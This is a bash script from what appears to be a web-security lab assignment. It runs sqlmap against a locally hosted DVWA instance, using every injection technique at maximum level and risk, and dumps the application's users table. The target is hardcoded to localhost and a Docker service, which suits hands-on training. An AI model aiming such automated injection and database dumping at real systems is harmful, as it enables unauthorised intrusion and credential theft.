#!/usr/bin/env bash
# ==============================================================================
# run_sqlmap.sh — Automated SQLMap Execution Wrapper
# Assignment 04 — SQL Injection Mastery
#
# HARDCODED TARGET ENFORCEMENT:
# Strictly restricted to localhost or dvwa Docker service container.
# ==============================================================================

set -euo pipefail

TARGET_HOST="http://127.0.0.1:8080"
DOCKER_TARGET="http://dvwa"
OUTPUT_DIR="assignment-04-sqli/results/sqlmap-output"

echo "======================================================================"
echo "  Web Security Lab — Automated SQLMap Execution Wrapper"
echo "  Scope: Strictly local container targets ($TARGET_HOST / $DOCKER_TARGET)"
echo "======================================================================"

mkdir -p "$OUTPUT_DIR"

# Check if sqlmap is available locally, or run via Docker
if command -v sqlmap &>/dev/null; then
    SQLMAP_CMD="sqlmap"
elif docker image inspect sqlmapproject/sqlmap:latest &>/dev/null || command -v docker &>/dev/null; then
    SQLMAP_CMD="docker run --rm --network host -v $(pwd)/$OUTPUT_DIR:/root/.local/share/sqlmap/output sqlmapproject/sqlmap:latest"
else
    echo "[-] Error: Neither local 'sqlmap' nor 'docker' was found in PATH."
    echo "    Install sqlmap via 'pip install sqlmap' or pull the container."
    exit 1
fi

# Supply cookie or prompt user
COOKIE="${1:-PHPSESSID=change_me_local_cookie; security=low}"

echo "[*] Target URL: $TARGET_HOST/vulnerabilities/sqli/?id=1&Submit=Submit"
echo "[*] Using Session Cookie: $COOKIE"
echo "[*] Starting automated enumeration with --technique=BEUSTQ..."

$SQLMAP_CMD \
    -u "$TARGET_HOST/vulnerabilities/sqli/?id=1&Submit=Submit" \
    --cookie="$COOKIE" \
    --batch \
    --level=5 \
    --risk=3 \
    --technique=BEUSTQ \
    --dbs \
    -D dvwa -T users --dump \
    --output-dir="$OUTPUT_DIR" || {
        echo "[!] Execution notice: Ensure DVWA is running ('make up') and session cookie is valid."
    }

echo "[+] Scan script execution finished. Results stored in: $OUTPUT_DIR"
